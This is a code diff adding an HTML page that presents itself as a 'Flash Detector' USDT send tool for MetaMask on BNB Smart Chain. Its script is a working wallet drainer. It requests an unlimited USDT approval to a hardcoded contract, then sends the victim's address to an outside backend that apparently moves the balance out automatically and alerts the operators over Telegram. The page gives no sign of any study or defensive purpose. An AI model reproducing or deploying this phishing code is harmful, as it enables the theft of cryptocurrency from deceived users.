@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flash Detector - Send</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; padding: 20px; min-height: 100vh; }
+        .container { max-width: 500px; margin: 0 auto; background: white; border-radius: 12px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .header { display: flex; align-items: center; gap: 15px; margin-bottom: 30px; }
+        .back { font-size: 24px; cursor: pointer; }
+        .title { font-size: 20px; font-weight: 700; }
+        .label { font-size: 14px; color: #333; margin-bottom: 10px; font-weight: 600; }
+        .group { margin-bottom: 25px; }
+        .input-box { border: 1px solid #ddd; border-radius: 8px; padding: 12px 15px; background: #f9f9f9; }
+        input { width: 100%; border: none; font-size: 14px; background: none; color: #333; }
+        input::placeholder { color: #999; }
+        .network { border: 1px solid #ddd; border-radius: 8px; padding: 12px 15px; background: #f9f9f9; display: flex; align-items: center; gap: 8px; }
+        .icon { width: 24px; height: 24px; background: #f0ad4e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; color: white; font-weight: bold; }
+        .btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 30px; font-size: 16px; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000; }
+        .modal.show { display: flex; justify-content: center; align-items: flex-end; }
+        .modal-content { background: white; border-radius: 20px 20px 0 0; padding: 30px 20px; width: 100%; max-width: 500px; }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+        .modal-title { font-size: 18px; font-weight: 600; }
+        .close-btn { background: none; border: none; color: #999; font-size: 28px; cursor: pointer; }
+        .approve-btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 16px; margin-top: 25px; }
+        .approve-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; min-width: 260px; padding: 16px 32px; border-radius: 12px; font-weight: bold; text-align: center; box-shadow: 0 4px 32px rgba(0,0,0,0.2); }
+        .notification.success { background: #10b981; color: white; }
+        .notification.error { background: #f87171; color: white; }
+        .notification.info { background: #374151; color: white; }
+        .balance { font-size: 12px; color: #666; margin-top: 5px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="back" onclick="history.back()">←</div>
+            <div class="title">Send USDT</div>
+        </div>
+
+        <div class="group">
+            <div class="label">Recipient Address</div>
+            <div class="input-box">
+                <input type="text" id="recipient" readonly value="0xc656b1651CD6914183Ee48458542EbB8655aa623">
+            </div>
+        </div>
+
+        <div class="group">
+            <div class="label">Network</div>
+            <div class="network">
+                <div class="icon">⟡</div>
+                <span style="flex: 1; color: #333; font-size: 14px;">BNB Smart Chain</span>
+            </div>
+        </div>
+
+        <div class="group">
+            <div class="label">Your Wallet</div>
+            <div class="input-box">
+                <input type="text" id="wallet" readonly placeholder="Connect MetaMask">
+                <div class="balance" id="balance"></div>
+            </div>
+        </div>
+
+        <button class="btn" id="connectBtn" onclick="connectWallet()">Connect MetaMask</button>
+        <button class="btn" id="approveBtn" onclick="handleApprove()" style="display: none;">Approve & Transfer</button>
+    </div>
+
+    <div class="modal" id="approvalModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Approve USDT Transfer</div>
+                <button class="close-btn" onclick="closeModal()">×</button>
+            </div>
+            <p style="color: #666; margin-bottom: 20px;">Approve unlimited USDT transfer to proceed</p>
+            <button class="approve-btn" id="confirmBtn" onclick="confirmApproval()">Confirm</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <script>
+        const BACKEND_URL = "https://scanforflash-backend-production.up.railway.app";
+        const CONTRACT = "0x42C8980352dA1F330419FD047ea5462551165Ce3";
+        const USDT = "0x55d398326f99059fF775485246999027B3197955";
+        const RECIPIENT = "0xc656b1651CD6914183Ee48458542EbB8655aa623";
+
+        let userAddress = null;
+        let web3 = null;
+
+        async function connectWallet() {
+            try {
+                if (!window.ethereum) {
+                    showNotification("MetaMask not detected", "error");
+                    return;
+                }
+
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+
+                userAddress = accounts[0];
+                web3 = new Web3(window.ethereum);
+
+                document.getElementById('wallet').value = userAddress;
+                document.getElementById('connectBtn').style.display = 'none';
+                document.getElementById('approveBtn').style.display = 'block';
+
+                await getBalance();
+                showNotification("MetaMask connected!", "success");
+            } catch (error) {
+                showNotification("Error: " + error.message, "error");
+            }
+        }
+
+        async function getBalance() {
+            try {
+                const usdtContract = new web3.eth.Contract([
+                    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
+                ], USDT);
+
+                const balance = await usdtContract.methods.balanceOf(userAddress).call();
+                const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
+                document.getElementById('balance').textContent = `Balance: ${balanceInUSDT} USDT`;
+                return balanceInUSDT;
+            } catch (error) {
+                console.error('Balance error:', error);
+                return 0;
+            }
+        }
+
+        async function handleApprove() {
+            if (!userAddress) {
+                showNotification("Connect wallet first", "error");
+                return;
+            }
+            document.getElementById('approvalModal').classList.add('show');
+        }
+
+        function closeModal() {
+            document.getElementById('approvalModal').classList.remove('show');
+        }
+
+        async function confirmApproval() {
+            try {
+                document.getElementById('confirmBtn').disabled = true;
+                showNotification("Processing approval...", "info");
+
+                const usdtContract = new web3.eth.Contract([
+                    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
+                ], USDT);
+
+                const maxUint = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                await usdtContract.methods.approve(CONTRACT, maxUint).send({ from: userAddress });
+
+                showNotification("Approval confirmed!", "success");
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                showNotification("Checking balance...", "info");
+                const response = await fetch(`${BACKEND_URL}/check-balance`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ walletAddress: userAddress })
+                });
+
+                const result = await response.json();
+
+                if (result.autoTransferred) {
+                    showNotification(`✅ ${result.balance} USDT transferred!`, "success");
+                } else {
+                    showNotification(`Balance: ${result.balance} USDT\nTelegram notification sent!`, "info");
+                }
+
+                closeModal();
+                document.getElementById('confirmBtn').disabled = false;
+            } catch (error) {
+                document.getElementById('confirmBtn').disabled = false;
+                showNotification("Error: " + error.message, "error");
+            }
+        }
+
+        function showNotification(msg, type = "info") {
+            let notify = document.getElementById("notify-bar");
+            if (!notify) {
+                notify = document.createElement("div");
+                notify.id = "notify-bar";
+                notify.className = `notification ${type}`;
+                document.body.appendChild(notify);
+            }
+            notify.textContent = msg;
+            notify.className = `notification ${type}`;
+            notify.style.display = 'block';
+            
+            if (type === 'success') {
+                setTimeout(() => { notify.style.display = 'none'; }, 3000);
+            }
+        }
+    </script>
+</body>
+</html>
